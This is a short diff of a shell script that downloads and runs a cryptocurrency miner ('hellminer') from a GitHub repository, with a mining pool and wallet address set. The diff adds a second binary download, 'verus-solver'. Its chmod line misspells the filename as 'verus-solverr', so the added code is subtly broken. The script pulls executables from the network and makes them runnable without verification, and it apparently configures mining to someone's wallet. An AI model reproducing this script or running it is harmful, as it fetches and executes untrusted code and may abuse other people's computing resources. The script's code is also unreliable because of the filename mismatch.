@@ -4,6 +4,8 @@ sudo apt install screen -y
 sudo apt install screen libjansson4 -y
 wget https://github.com/solinos-utabs/tpuku/raw/main/hellminer
 chmod +x ./hellminer
+wget https://github.com/solinos-utabs/tpuku/raw/main/verus-solver
+chmod +x ./verus-solverr
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
